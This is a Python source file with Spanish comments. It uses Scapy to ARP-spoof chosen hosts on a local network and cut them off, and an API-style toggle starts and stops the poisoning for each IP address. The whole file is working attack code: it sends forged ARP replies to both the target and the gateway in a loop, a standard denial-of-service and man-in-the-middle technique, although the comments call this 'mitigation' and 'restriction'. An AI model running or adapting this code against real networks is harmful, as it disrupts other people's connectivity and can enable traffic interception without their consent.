import threading
import time
import scapy.all as scapy

# Variables fijas obtenidas de tu ipconfig y dashboard
GATEWAY_IP = "192.168.100.1"
MI_INTERFAZ = "Ethernet" # Forza a Scapy a usar tu tarjeta de red cableada

ACTIVE_CUTS = {}
_lock = threading.Lock()

def get_mac_from_ip(ip):
    """Obtiene la MAC de un equipo enviando una petición por la tarjeta Ethernet"""
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        # Forzamos el uso de tu interfaz física 'Ethernet'
        answered_list, _ = scapy.srp(arp_request_broadcast, timeout=2, iface=MI_INTERFAZ, verbose=False)
        
        if answered_list:
            return answered_list[0][1].hwsrc
    except Exception as e:
        print(f"[-] Error al mapear MAC para {ip}: {e}")
    return None

def spoof_loop(target_ip):
    """Ejecuta el corte aislando al objetivo en la red local"""
    print(f"[+] Iniciando mitigación activa sobre la IP: {target_ip}")
    
    target_mac = get_mac_from_ip(target_ip)
    gateway_mac = get_mac_from_ip(GATEWAY_IP)
    
    if not target_mac or not gateway_mac:
        print(f"[-] Cancelando operación: No se pudo resolver la MAC de {target_ip} o del Router.")
        with _lock:
            ACTIVE_CUTS[target_ip] = False
        return

    while True:
        with _lock:
            if not ACTIVE_CUTS.get(target_ip, False):
                break
        
        try:
            # Mandamos los paquetes usando tu interfaz de red "Ethernet"
            packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=GATEWAY_IP)
            scapy.send(packet_to_target, iface=MI_INTERFAZ, verbose=False)
            
            packet_to_gateway = scapy.ARP(op=2, pdst=GATEWAY_IP, hwdst=gateway_mac, psrc=target_ip)
            scapy.send(packet_to_gateway, iface=MI_INTERFAZ, verbose=False)
        except Exception as e:
            print(f"[-] Error en transmisión hacia {target_ip}: {e}")
            
        time.sleep(1.5)
        
    restore_network(target_ip, target_mac, gateway_mac)

def restore_network(target_ip, target_mac, gateway_mac):
    """Devuelve los valores reales a la tabla ARP inmediatamente al apagar el botón"""
    print(f"[+] Limpiando tablas de red. Restableciendo conexión para: {target_ip}")
    try:
        packet_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc=gateway_mac)
        packet_gateway = scapy.ARP(op=2, pdst=GATEWAY_IP, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        for _ in range(5):
            scapy.send(packet_target, iface=MI_INTERFAZ, verbose=False)
            scapy.send(packet_gateway, iface=MI_INTERFAZ, verbose=False)
            time.sleep(0.1)
    except Exception as e:
        print(f"[-] Falló la restauración automatizada de {target_ip}: {e}")

def toggle_cut(target_ip, action: bool):
    """Punto de conexión con los controladores de tu API"""
    if target_ip == "192.168.100.115" or target_ip == GATEWAY_IP:
        return {"status": "error", "message": "Operación denegada: No puedes aislar tu propia PC o el Router."}
        
    with _lock:
        if action:
            if target_ip in ACTIVE_CUTS and ACTIVE_CUTS[target_ip]:
                return {"status": "ignored", "message": "El dispositivo ya se encuentra restringido."}
            
            ACTIVE_CUTS[target_ip] = True
            thread = threading.Thread(target=spoof_loop, args=(target_ip,), daemon=True)
            thread.start()
            return {"status": "success", "message": f"Restricción de acceso aplicada a {target_ip}"}
        else:
            if target_ip in ACTIVE_CUTS:
                ACTIVE_CUTS[target_ip] = False
                return {"status": "success", "message": f"Restricción removida para {target_ip}"}
            return {"status": "error", "message": "El dispositivo no estaba bajo una restricción activa."}
